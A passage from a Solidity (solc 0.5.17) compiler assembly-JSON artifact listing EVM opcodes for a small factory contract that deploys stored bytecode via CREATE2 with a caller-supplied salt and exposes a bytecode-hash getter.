									"begin": 5234,
									"end": 10771,
									"name": "ADD"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "OR"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP6"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SSTORE"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH [tag]",
									"value": "5"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMP"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "tag",
									"value": "6"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMPDEST"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP3"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "ADD"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "ADD"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP6"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SSTORE"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP3"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "ISZERO"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH [tag]",
									"value": "5"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMPI"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP2"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP3"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "ADD"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "tag",
									"value": "7"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMPDEST"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP3"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP2"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "GT"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "ISZERO"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH [tag]",
									"value": "8"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMPI"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP3"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "MLOAD"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP3"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SSTORE"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP2"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "ADD"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP2"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "ADD"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH [tag]",
									"value": "7"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMP"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "tag",
									"value": "8"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMPDEST"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "tag",
									"value": "5"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMPDEST"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "POP"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "POP"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH [tag]",
									"value": "9"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP2"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH [tag]",
									"value": "10"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMP",
									"value": "[in]"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "tag",
									"value": "9"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMPDEST"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "POP"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMP",
									"value": "[out]"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "tag",
									"value": "10"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMPDEST"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH [tag]",
									"value": "11"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP2"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "tag",
									"value": "12"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMPDEST"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP3"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "GT"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "ISZERO"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH [tag]",
									"value": "13"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMPI"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP2"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SSTORE"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "POP"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "ADD"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH [tag]",
									"value": "12"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMP"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "tag",
									"value": "13"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMPDEST"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "POP"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMP"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "tag",
									"value": "11"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMPDEST"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "SWAP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMP",
									"value": "[out]"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "tag",
									"value": "4"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "JUMPDEST"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "DUP1"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "CODECOPY"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 5234,
									"end": 10771,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a7231582061d868efb6f224ae8c36f2a57c1bc8c70922b32b38bbed0a91402ed73da8966a64736f6c63430005110032",
									".code": [
										{
											"begin": 5234,
											"end": 10771,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "MSTORE"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "POP"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "LT"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "JUMPI"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "SHR"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "DUP1"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "PUSH",
											"value": "2B85BA38"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "EQ"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "JUMPI"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "DUP1"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "PUSH",
											"value": "D13319C4"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "EQ"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "JUMPI"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "JUMPDEST"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "DUP1"
										},
										{
											"begin": 5234,
											"end": 10771,
											"name": "REVERT"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "JUMPDEST"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "DUP1"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "DUP2"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "ADD"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "SWAP1"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "DUP1"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "DUP1"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "SWAP1"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "ADD"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "SWAP1"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "SWAP3"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "SWAP2"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "SWAP1"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "POP"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "POP"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "POP"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "JUMPDEST"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "MLOAD"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "DUP1"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "DUP3"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "AND"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "AND"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "DUP2"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "MSTORE"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "ADD"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "SWAP2"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "POP"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "POP"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "MLOAD"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "DUP1"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "SWAP2"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "SUB"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "SWAP1"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "RETURN"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "JUMPDEST"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "JUMPDEST"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "MLOAD"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "DUP1"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "DUP3"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "DUP2"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "MSTORE"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "ADD"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "SWAP2"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "POP"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "POP"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "MLOAD"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "DUP1"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "SWAP2"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "SUB"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "SWAP1"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "RETURN"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "JUMPDEST"
										},
										{
											"begin": 10461,
											"end": 10468,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 10477,
											"end": 10498,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 10501,
											"end": 10517,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SLOAD"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP2"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "AND"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "ISZERO"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "MUL"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SUB"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "AND"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DIV"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "ADD"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP2"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DIV"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "MUL"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "ADD"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "MLOAD"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP2"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "ADD"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "MSTORE"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP3"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP2"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP2"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP2"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "MSTORE"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "ADD"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP3"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SLOAD"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP2"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "AND"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "ISZERO"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "MUL"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SUB"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "AND"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DIV"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "ISZERO"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "JUMPI"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "LT"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "JUMPI"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP4"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SLOAD"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DIV"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "MUL"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP4"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "MSTORE"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP2"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "ADD"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP2"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "JUMP"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "JUMPDEST"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP3"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "ADD"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP2"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "MSTORE"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "KECCAK256"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "JUMPDEST"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP2"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SLOAD"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP2"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "MSTORE"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "ADD"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "ADD"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP4"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "GT"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "JUMPI"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP3"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SUB"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "AND"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "DUP3"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "ADD"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP2"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "JUMPDEST"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "POP"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "POP"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "POP"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "POP"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "POP"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "SWAP1"
										},
										{
											"begin": 10477,
											"end": 10517,
											"name": "POP"
										},
										{
											"begin": 10524,
											"end": 10536,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 10626,
											"end": 10630,
											"name": "DUP4"
										},
										{
											"begin": 10615,
											"end": 10623,
											"name": "DUP3"
										},
										{
											"begin": 10609,
											"end": 10624,
											"name": "MLOAD"
										},
										{
											"begin": 10602,
											"end": 10606,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 10592,
											"end": 10600,
											"name": "DUP5"
										},
										{
											"begin": 10588,
											"end": 10607,
											"name": "ADD"
										},
										{
											"begin": 10585,
											"end": 10586,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 10577,
											"end": 10631,
											"name": "CREATE2"
										},
										{
											"begin": 10569,
											"end": 10631,
											"name": "SWAP1"
										},
										{
											"begin": 10569,
											"end": 10631,
											"name": "POP"
										},
										{
											"begin": 10651,
											"end": 10655,
											"name": "DUP1"
										},
										{
											"begin": 10644,
											"end": 10655,
											"name": "SWAP3"
										},
										{
											"begin": 10644,
											"end": 10655,
											"name": "POP"
										},
										{
											"begin": 10644,
											"end": 10655,
											"name": "POP"
										},
										{
											"begin": 10644,
											"end": 10655,
											"name": "POP"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "SWAP2"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "SWAP1"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "POP"
										},
										{
											"begin": 10416,
											"end": 10659,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "JUMPDEST"
										},
										{
											"begin": 10703,
											"end": 10710,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 10739,
											"end": 10755,
											"name": "DUP1"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "MLOAD"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DUP1"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DUP3"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DUP1"
										},
